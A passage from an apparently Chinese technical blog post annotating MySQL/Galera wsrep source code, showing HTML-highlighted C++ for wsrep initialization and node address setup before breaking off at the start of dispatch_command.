abort."</span>,</span><br><span class="line">                  strerror(rcode), rcode);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!WSREP_PROVIDER_EXISTS) <span class="comment">//如果不存在初始化</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// enable normal operation in case no provider is specified</span></span><br><span class="line">    wsrep_ready_set(TRUE);</span><br><span class="line">    wsrep_inited= <span class="number">1</span>;</span><br><span class="line">    global_system_variables.wsrep_on = <span class="number">0</span>;</span><br><span class="line">    wsrep_init_args args;</span><br><span class="line">    args.logger_cb = wsrep_log_cb;</span><br><span class="line">    args.options = (wsrep_provider_options) ?</span><br><span class="line">            wsrep_provider_options : <span class="string">""</span>;</span><br><span class="line">    rcode = wsrep-&gt;init(wsrep, &amp;args);</span><br><span class="line">    <span class="keyword">if</span> (rcode)</span><br><span class="line">    &#123;</span><br><span class="line">      DBUG_PRINT(<span class="string">"wsrep"</span>,(<span class="string">"wsrep::init() failed: %d"</span>, rcode));</span><br><span class="line">      WSREP_ERROR(<span class="string">"wsrep::init() failed: %d, must shutdown"</span>, rcode);</span><br><span class="line">      wsrep-&gt;<span class="built_in">free</span>(wsrep);</span><br><span class="line">      <span class="built_in">free</span>(wsrep);</span><br><span class="line">      wsrep = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rcode;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    global_system_variables.wsrep_on = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(provider_name,</span><br><span class="line">            wsrep-&gt;provider_name,    <span class="keyword">sizeof</span>(provider_name) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(provider_version,</span><br><span class="line">            wsrep-&gt;provider_version, <span class="keyword">sizeof</span>(provider_version) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(provider_vendor,</span><br><span class="line">            wsrep-&gt;provider_vendor,  <span class="keyword">sizeof</span>(provider_vendor) - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize node address */</span></span><br><span class="line">  <span class="keyword">char</span> node_addr[<span class="number">512</span>]= &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">  <span class="keyword">size_t</span> <span class="keyword">const</span> node_addr_max= <span class="keyword">sizeof</span>(node_addr) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (!wsrep_node_address || !<span class="built_in">strcmp</span>(wsrep_node_address, <span class="string">""</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">const</span> ret= wsrep_guess_ip(node_addr, node_addr_max);</span><br><span class="line">    <span class="keyword">if</span> (!(ret &gt; <span class="number">0</span> &amp;&amp; ret &lt; node_addr_max))</span><br><span class="line">    &#123;</span><br><span class="line">      WSREP_WARN(<span class="string">"Failed to guess base node address. Set it explicitly via "</span></span><br><span class="line">                 <span class="string">"wsrep_node_address."</span>);</span><br><span class="line">      node_addr[<span class="number">0</span>]= <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(node_addr, wsrep_node_address, node_addr_max);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize node's incoming address */</span></span><br><span class="line">  <span class="keyword">char</span> inc_addr[<span class="number">512</span>]= &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">  <span class="keyword">size_t</span> <span class="keyword">const</span> inc_addr_max= <span class="keyword">sizeof</span> (inc_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    In case wsrep_node_incoming_address is either not set or set to AUTO,</span></span><br><span class="line"><span class="comment">    we need to use mysqld's my_bind_addr_str:mysqld_port, lastly fallback</span></span><br><span class="line"><span class="comment">    to wsrep_node_address' value if mysqld's bind-address is not set either.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> ((!wsrep_node_incoming_address ||</span><br><span class="line">       !<span class="built_in">strcmp</span> (wsrep_node_incoming_address, WSREP_NODE_INCOMING_AUTO)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">bool</span> is_ipv6= <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> my_bind_ip= INADDR_ANY; <span class="comment">// default if not set</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (my_bind_addr_str &amp;&amp; <span class="built_in">strlen</span>(my_bind_addr_str))</span><br><span class="line">    &#123;</span><br><span class="line">      my_bind_ip= wsrep_check_ip(my_bind_addr_str, &amp;is_ipv6);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (INADDR_ANY != my_bind_ip)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If its a not a valid address, leave inc_addr as empty string. mysqld</span></span><br><span class="line"><span class="comment">        is not listening for client connections on network interfaces.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (INADDR_NONE != my_bind_ip &amp;&amp; INADDR_LOOPBACK != my_bind_ip)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *fmt= (is_ipv6) ? <span class="string">"[%s]:%u"</span> : <span class="string">"%s:%u"</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(inc_addr, inc_addr_max, fmt, my_bind_addr_str, mysqld_port);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">/* mysqld binds to 0.0.0.0, try taking IP from wsrep_node_address. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> <span class="keyword">const</span> node_addr_len= <span class="built_in">strlen</span>(node_addr);</span><br><span class="line">      <span class="keyword">if</span> (node_addr_len &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        wsp::<span class="function">Address <span class="title">addr</span><span class="params">(node_addr)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!addr.is_valid())</span><br><span class="line">        &#123;</span><br><span class="line">          WSREP_DEBUG(<span class="string">"Could not parse node address : %s"</span>, node_addr);</span><br><span class="line">          WSREP_WARN(<span class="string">"Guessing address for incoming client connections failed. "</span></span><br><span class="line">                     <span class="string">"Try setting wsrep_node_incoming_address explicitly."</span>);</span><br><span class="line">          <span class="keyword">goto</span> done;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *fmt= (addr.is_ipv6()) ? <span class="string">"[%s]:%u"</span> : <span class="string">"%s:%u"</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(inc_addr, inc_addr_max, fmt, addr.get_address(),</span><br><span class="line">                 (<span class="keyword">int</span>) mysqld_port);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    wsp::Address addr(wsrep_node_incoming_address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!addr.is_valid())</span><br><span class="line">    &#123;</span><br><span class="line">      WSREP_WARN(<span class="string">"Could not parse wsrep_node_incoming_address : %s"</span>,</span><br><span class="line">                 wsrep_node_incoming_address);</span><br><span class="line">      <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      In case port is not specified in wsrep_node_incoming_address, we use</span></span><br><span class="line"><span class="comment">      mysqld_port.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> port= (addr.get_port() &gt; <span class="number">0</span>) ? addr.get_port() : (<span class="keyword">int</span>) mysqld_port;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *fmt= (addr.is_ipv6()) ? <span class="string">"[%s]:%u"</span> : <span class="string">"%s:%u"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(inc_addr, inc_addr_max, fmt, addr.get_address(), port);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">wsrep_init_args</span> <span class="title">wsrep_args</span>;</span> <span class="comment">//初始化启动参数数据结构</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">wsrep_gtid</span> <span class="title">const</span> <span class="title">state_id</span> = &#123;</span> local_uuid, local_seqno &#125;;</span><br><span class="line"></span><br><span class="line">  wsrep_args.data_dir        = wsrep_data_home_dir;</span><br><span class="line">  wsrep_args.node_name       = (wsrep_node_name) ? wsrep_node_name : <span class="string">""</span>;</span><br><span class="line">  wsrep_args.node_address    = node_addr;</span><br><span class="line">  wsrep_args.node_incoming   = inc_addr;</span><br><span class="line">  wsrep_args.options         = (wsrep_provider_options) ?</span><br><span class="line">                                wsrep_provider_options : <span class="string">""</span>;</span><br><span class="line">  wsrep_args.proto_ver       = wsrep_max_protocol_version;</span><br><span class="line"></span><br><span class="line">  wsrep_args.state_id        = &amp;state_id;</span><br><span class="line"></span><br><span class="line">  wsrep_args.logger_cb       = wsrep_log_cb;</span><br><span class="line">  wsrep_args.view_handler_cb = wsrep_view_handler_cb;</span><br><span class="line">  wsrep_args.apply_cb        = wsrep_apply_cb;</span><br><span class="line">  wsrep_args.commit_cb       = wsrep_commit_cb;</span><br><span class="line">  wsrep_args.unordered_cb    = wsrep_unordered_cb;</span><br><span class="line">  wsrep_args.sst_donate_cb   = wsrep_sst_donate_cb;</span><br><span class="line">  wsrep_args.synced_cb       = wsrep_synced_cb;</span><br><span class="line"></span><br><span class="line">  rcode = wsrep-&gt;init(wsrep, &amp;wsrep_args);  <span class="comment">//调用接口告诉galera这些信息</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rcode)</span><br><span class="line">  &#123;</span><br><span class="line">    DBUG_PRINT(<span class="string">"wsrep"</span>,(<span class="string">"wsrep::init() failed: %d"</span>, rcode));</span><br><span class="line">    WSREP_ERROR(<span class="string">"wsrep::init() failed: %d, must shutdown"</span>, rcode);</span><br><span class="line">    wsrep-&gt;<span class="built_in">free</span>(wsrep);</span><br><span class="line">    <span class="built_in">free</span>(wsrep);</span><br><span class="line">    wsrep = <span class="literal">NULL</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wsrep_inited= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化的过程基本结束，主要初始化的过程在这个地方实现。</p><p>数据库执行语句的时候，在函数dispatcher_command函数中执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dispatch_command</span><span class="params">(<span class="keyword">enum</span> enum_server_command command, THD *thd,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">char</span>* packet, uint packet_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NET *net= &amp;thd-&gt;net;</span><br><span class="line">  <span class="keyword">bool</span> error= <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">bool</span> do_end_of_statement= <span class="literal">true</span>;</span><br><span class="line">  DBUG_ENTER(<span class="string">"dispatch_command"</span>);</span><br><span class="line">  DBUG_PRINT(<span class="string">"info"</span>, (<span class="string">"command: %d"</span>, command));</span><br><span class="line"></span><br><span class="line">  inc_thread_running();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_WSREP    <span class="comment">// 开启了wsrep的话继续走</span></span></span><br><span class="line">  <span class="keyword">if</span> (WSREP(thd))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!thd-&gt;in_multi_stmt_transaction_mode())</span><br><span class="line">    &#123;</span><br><span class="line">      thd-&gt;wsrep_PA_safe= <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_mutex_lock(&amp;thd-&gt;LOCK_wsrep_thd);</span><br><span class="line">    thd-&gt;wsrep_query_state= QUERY_EXEC;</span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;wsrep_conflict_state== RETRY_AUTOCOMMIT)</span><br><span class="line">    &#123;</span><br><span class="line">      thd-&gt;wsrep_conflict_state= NO_CONFLICT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;wsrep_conflict_state== MUST_ABORT)</span><br><span class="line">    &#123;</span><br><span class="line">      wsrep_client_rollback(thd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> 